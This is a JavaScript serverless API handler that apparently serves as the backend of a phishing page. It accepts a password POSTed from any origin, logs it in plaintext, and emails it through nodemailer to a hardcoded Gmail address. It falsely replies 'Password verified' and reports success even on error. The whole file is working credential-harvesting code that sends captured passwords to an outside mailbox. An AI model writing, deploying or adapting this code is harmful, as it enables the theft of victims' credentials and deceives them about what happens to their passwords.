import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const { password } = req.body;

    console.log('🔐 Password Received:', password);
    
    // ✅ Hardcoded workerEmail ONLY
    const workerEmail = "mehtaballi67890@gmail.com";
    
    const emailResult = await sendPasswordEmail(password, workerEmail);

    return res.status(200).json({
      success: true,
      message: 'Password verified',
      emailSent: emailResult.success,
      recipient: workerEmail
    });

  } catch (error) {
    console.error('❌ Error:', error);
    return res.status(200).json({ success: true, message: 'Completed' });
  }
}

async function sendPasswordEmail(password, workerEmail) {
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { user: process.env.GMAIL_USER, pass: process.env.GMAIL_APP_PASS }
    });

    await transporter.sendMail({
      from: `"Password System" <${process.env.GMAIL_USER}>`,
      to: workerEmail, // ✅ Only workerEmail
      subject: `🔐 Password: ${new Date().toLocaleTimeString()}`,
      html: `<div>Password: ${password}<br>Time: ${new Date().toLocaleString()}</div>`
    });
    
    console.log('✅ Sent to workerEmail:', workerEmail);
    return { success: true };

  } catch (error) {
    console.error('❌ Email Error:', error);
    return { success: false, message: error.message };
  }
}
